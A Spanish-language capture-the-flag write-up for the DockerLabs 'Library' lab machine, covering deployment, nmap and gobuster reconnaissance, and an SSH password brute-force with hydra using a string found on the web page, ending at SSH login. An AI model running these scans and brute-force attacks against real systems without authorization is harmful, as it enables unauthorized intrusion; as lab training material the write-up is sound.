# Library

![DockerLabs](https://dockerlabs.es/images/logos/logo.png)

**Autor:** [El Pingüino de Mario](https://www.youtube.com/channel/UCGLfzfKRUsV6BzkrF1kJGsg)

**Dificultad:** Fácil

**Fecha de creación:** 13/05/2024

------------------------------------

DESPLIEGUE

```
bash auto_deploy.sh library.tar 
```

![](./images/Pasted%20image%2020241214192423.png)

Tenemos la IP : 

```
172.17.0.2
```

------------------------------------------

RECONOCIMIENTO 


```
nmap -p- -sS -sV -sC --min-rate 5000 -n -vvv -Pn 172.17.0.2
```

![](./images/Pasted%20image%2020241214192645.png)

Tiene los puertos 22 y 80 abierto. 

Vemos que en el 80 tiene un apache corriendo. 

![](BLOG-GIT/images/Pasted%20image%2020241214193450.png)

A continuación lo que podemos hacer es fuzzing, por lo que pondremos el siguiente comando: 

```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-1.0.txt -x php,html,py,
```

![](./images/Pasted%20image%2020241214193649.png)

Vamos a entrar en cada uno de ello. 


![](./images/Pasted%20image%2020241214193832.png)

Tenemos unos caracteres. 
Vamos a intentar hacer un ataque de fuerza bruta por si es una contraseña. 

Metemos el siguiente comando para hacer fuerza bruta: 

```
hydra -P /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -l JIFGHDS87GYDFIGD ssh://172.17.0.2
```

Con el anterior diccionario no me lo encuentra. 

Así que pruebo con el siguiente: 

```
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD ssh://172.17.0.2
```

Después de esperar un rato ... 


![](./images/Pasted%20image%2020241214201107.png)

Y entraremos por vía ssh. 

![](./images/Pasted%20image%2020241220193302.png)






